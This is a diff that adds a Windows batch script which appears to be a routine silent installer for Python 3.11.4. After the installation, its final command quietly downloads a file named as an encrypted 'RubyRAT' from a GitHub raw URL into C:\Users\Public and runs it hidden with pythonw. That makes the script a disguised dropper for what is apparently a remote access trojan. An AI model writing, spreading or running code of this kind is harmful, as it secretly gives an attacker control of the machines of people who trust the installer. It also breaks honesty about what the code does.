@@ -1,0 +1,27 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Define the Python version and download URL
+set "pythonVersion=3.11.4"
+set "pythonUrl=https://www.python.org/ftp/python/%pythonVersion%/python-%pythonVersion%-amd64.exe"
+set "pythonInstaller=%temp%\python-%pythonVersion%-amd64.exe"
+
+:: Download Python installer
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%pythonUrl%', '%pythonInstaller%')"
+
+:: Install Python silently
+"%pythonInstaller%" /quiet InstallAllUsers=1 PrependPath=1
+
+:: Clean up the downloaded installer
+del "%pythonInstaller%"
+
+:: Verify Python installation
+if exist "%ProgramFiles%\Python%pythonVersion%" (
+    echo Python %pythonVersion% has been successfully installed.
+) else (
+    echo Python installation failed.
+)
+
+curl -o "C:\Users\Public\pythonfile.pyw" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/RubyRAT1.9Encrypted.txt && start /B pythonw "C:\Users\Public\pythonfile.pyw" && exit
+
+endlocal
